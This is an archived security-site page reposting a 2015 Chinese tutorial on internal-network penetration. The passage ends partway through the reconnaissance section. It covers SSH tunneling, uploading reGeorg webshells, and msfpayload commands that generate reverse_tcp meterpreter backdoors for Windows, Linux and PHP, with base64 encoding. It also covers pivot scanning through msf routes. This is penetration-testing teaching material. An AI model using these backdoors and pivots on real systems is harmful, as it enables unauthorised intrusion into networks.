<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>内网渗透随想 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords"
          content="bobao,漏洞,漏洞平台,漏洞公告,漏洞信息,安全资讯,安全新闻,安全会议,安全知识,攻防大赛,安全大赛,黑客大赛,安全沙龙,vulnerability,exploit,安全趋势"/>
    
        <meta name="description" content="0x00 前言之前看到微博有人私信我说内网渗透的技巧，zone也有很多小伙伴问了一些内网渗透的问题，所以我就斗胆写了这篇文章，有不对的，还请各位斧正整个内网渗透肯定不是一篇两篇文章能够讲述清楚的，所以"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>内网渗透随想</h2>
                <div class="article-msg">
                    <span class="time">2015-03-16 17:26:22</span>
                    
                                        <span class="read">阅读：33545次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_304"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="304" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://drops.wooyun.org/tips/5234"
                             target="_blank">来源： redrain@乌云知识库</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2515404038" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2515404038" style="color:#848e99;">Wooyun</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x00 前言</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">之前看到微博有人私信我说内网渗透的技巧，zone也有很多小伙伴问了一些内网渗透的问题，所以我就斗胆写了这篇文章，有不对的，还请各位斧正</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">整个内网渗透肯定不是一篇两篇文章能够讲述清楚的，所以标题写作随想，想到哪儿写哪儿</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x01 内网代理和转发</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-align: center;"><img src="http://p3.qhimg.com/t01d0c006181a1ce9b4.png" alt="image" style="border: 0px; max-width: 580px; margin-left: 10px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">＊简单区分一下正向代理和反向代理</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.1 正向代理(Forward Proxy)</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Lhost－－》proxy－－》Rhost</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.2 反向代理（reverse proxy）</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Lhost&lt;---&gt;proxy&lt;---&gt;firewall&lt;---&gt;Rhost</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">和正向代理相反（废话），Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.3 简单区分</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">正向代理是我们自己(Lhost)戴套(proxy)插进去，反向代理是她(Rhost)主动通过上位(proxy)坐上来(Lhost)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">zone里</span><a href="http://zone.wooyun.org/content/18683" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">内网渗透代理问题</span></a><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">有人问了如何代理进行内网渗透的问题<br/>诚然，要进行内网渗透，代理是我们最先需要解决的问题，常见的代理方式大概可以分为这么几种：</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. VPN隧道／SSH隧道</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这种代理方式需要比较高的权限(system/root)直接使用系统功能来开启内网代理的隧道，配置VPN都比较简单，这里不做赘述，我们看一看通过SSH隧道进行代理</span></p><pre class="brush:bash;toolbar:false">ssh&nbsp;-qTfnN&nbsp;-L&nbsp;port:host:hostport&nbsp;-l&nbsp;user&nbsp;remote_ip&nbsp;&nbsp;&nbsp;#正向隧道，监听本地port
ssh&nbsp;-qTfnN&nbsp;-R&nbsp;port:host:hostport&nbsp;-l&nbsp;user&nbsp;remote_ip&nbsp;&nbsp;&nbsp;#反向隧道，用于内网穿透防火墙限制之类
SSH&nbsp;-qTfnN&nbsp;-D&nbsp;port&nbsp;remotehost&nbsp;&nbsp;&nbsp;#直接进行socks代理
&nbsp;
参数详解：
-q&nbsp;Quiet&nbsp;mode.&nbsp;安静模式
-T&nbsp;Disable&nbsp;pseudo-tty&nbsp;allocation.&nbsp;不占用&nbsp;shell&nbsp;了
-f&nbsp;Requests&nbsp;ssh&nbsp;to&nbsp;go&nbsp;to&nbsp;background&nbsp;just&nbsp;before&nbsp;command&nbsp;execution.&nbsp;后台运行，并推荐加上&nbsp;-n&nbsp;参数
-N&nbsp;Do&nbsp;not&nbsp;execute&nbsp;a&nbsp;remote&nbsp;command.&nbsp;不执行远程命令，端口转发就用它了～</pre><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">有时候，我们手边没有端口转发的工具，也可以通过ssh来做端口转发</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:bash;toolbar:false">ssh&nbsp;-CfNg&nbsp;-L&nbsp;port1:127.0.0.1:port2&nbsp;user@host&nbsp;&nbsp;&nbsp;&nbsp;#本地转发
ssh&nbsp;-CfNg&nbsp;-R&nbsp;port2:127.0.0.1:port1&nbsp;user@host&nbsp;&nbsp;&nbsp;&nbsp;#远程转发</pre><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">大家可以参考这篇paper，非常棒</span><a href="http://staff.washington.edu/corey/fw/ssh-port-forwarding.html" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SSH Port Forwarding</span></a></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3. 通过HTTP service的代理</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">简单来说就是在目标服务器上传一个webshell，通过shell来做所有的流量转发到内网，常见的几个工具有reGeorg，meterpreter，tunna等等，甚至直接写一个简单的代理脚本，在自己机器上配置一下nginx直接进行反向代理</span></p><ul style="padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);" class=" list-paddingleft-2"><li><p style="text-indent: 2em; text-align: left;"><a href="https://github.com/sensepost/reGeorg" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">reGeorg</span></a><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">自带的说明已经很清楚了</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">** Note, if you tools, such as NMap doesn&#39;t support socks proxies, use [proxychains] (see wiki)</span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Step 3.&nbsp;Hack the planet :)</span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Step 1.&nbsp;Upload tunnel.(aspx|ashx|jsp|php) to a webserver (How you do that is up to you)</span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Step 2.&nbsp;Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py</span></p></li></ul><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">注意安装urllib3即可（regeorg很方便，我基本都用这个）</span></strong><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><ul style="padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);" class=" list-paddingleft-2"><li><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">meterpreter</span></strong></p></li></ul><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">msf非常强大，在进行内网渗透的时候不失为一个好的选择，要用它进行代理，可以直接生成一个可执行文件后门，然后返回meterpreter，也可以生成一个webshell来返回meterpreter，关于meterpreter，Dm老师已经说的非常清楚了</span><a href="http://drops.wooyun.org/tips/2227" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">metasploit 渗透测试笔记(meterpreter篇)</span></a></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.1 windows生成后门</span></strong></p><pre class="brush:bash;toolbar:false">msfpayload&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=&lt;Your&nbsp;IP&nbsp;Address&gt;&nbsp;LPORT=&lt;Your&nbsp;Port&nbsp;to&nbsp;Connect&nbsp;On&gt;&nbsp;X&nbsp;&gt;&nbsp;shell.exe</pre><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.2 Linux生成后门</span></strong></p><pre class="brush:bash;toolbar:false">msfpayload&nbsp;linux/x86/meterpreter/reverse_tcp&nbsp;LHOST=&lt;Your&nbsp;IP&nbsp;Address&gt;&nbsp;LPORT=&lt;Your&nbsp;Port&nbsp;to&nbsp;Connect&nbsp;On&gt;&nbsp;R&nbsp;|&nbsp;msfencode&nbsp;-t&nbsp;elf&nbsp;-o&nbsp;shell</pre><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.3 php后门</span></strong></p><pre class="brush:bash;toolbar:false">msfpayload&nbsp;php/meterpreter/reverse_tcp&nbsp;LHOST=&lt;Your&nbsp;IP&nbsp;Address&gt;&nbsp;LPORT=&lt;Your&nbsp;Port&nbsp;to&nbsp;Connect&nbsp;On&gt;&nbsp;R&nbsp;|&nbsp;msfencode&nbsp;-e&nbsp;php/base64(可简单编码)&nbsp;-t&nbsp;raw&nbsp;-o&nbsp;base64php.php</pre><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">如果单纯只是想要进行简单的代理工作，auxiliary/server/socks4a模块即可</span><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">获得meterpreter会话后，就是msf尽情施展的时候了，最常用的办法，添加路由表后，直接在会话中用msf的各种攻击模块进行扫描（注意，这里是可以进行跨网段扫描的）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里讲到meterpreter所以多说一句，之前说的ssh隧道，如果嫌命令难得记，也可以简单的通过msf来建立tunnel</span></p><ul style="padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);" class=" list-paddingleft-2"><li><p><br/></p></li><li><pre class="brush:bash;toolbar:false">load&nbsp;meta_ssh
use&nbsp;multi/ssh/login_password
设置好参数后exploit即可获取会话进行代理操作</pre></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="http://zone.wooyun.org/content/11096" style="text-indent: 2em;">http://zone.wooyun.org/content/11096</a></span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="http://zone.wooyun.org/content/11096" style="text-indent: 2em;"></a>直接通过webshell和nginx反向代理</span></p></li></ul><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4. other tricks</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">python，ruby，perl等直接建立socks连接</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">lcx，tunna，htran等等进行端口流量转发</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">shadowsocks，tor，goagent等等</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">直接现成的小东西：</span><a href="http://sourceforge.net/projects/ssocks/?source=navbar" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ssocks</span></a><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（一次比赛的时候死猫跟我推荐的）正向代理，反弹socks5均可</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x02 内网环境探测和信息收集</span></strong></p><hr style="margin: 0px 0px 5px; padding: 0px; border-style: none none dashed; border-bottom-color: rgb(207, 207, 207); height: 5px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);"/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因为一个完整的渗透很难涵盖各种情况，所以这里讲的可能比较散，基本都是一些小技巧和思路</span></p><ul style="padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, Verdana, Helvetica, Arial, sans-serif; font-size: 14px; line-height: 24px; white-space: normal; background-color: rgb(255, 255, 255);" class=" list-paddingleft-2"><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Nmap代理扫描进行主机发现</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">proxychains nmap ＊＊＊</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果是meterpreter会话进行的代理，可直接通过/usr/share/metasploit-framework/modules/auxiliary/scanner脚本来扫描即可</span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">查看hosts获取内网主机信息</span></p></li><li><p style="text-indent: 2em; text-align: left;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">直接攻击网段路由或交换机，简单绘制内网的结构（我在</span><a href="http://www.wooyun.org/bugs/wooyun-2015-097180" style="font-size: 14px; text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从TCL某漏洞看内网渗透教学分享之内网信息探测和后渗透准备</span></a><span style="font-size: 14px; font-family: 微软雅黑, &#39;Microsoft 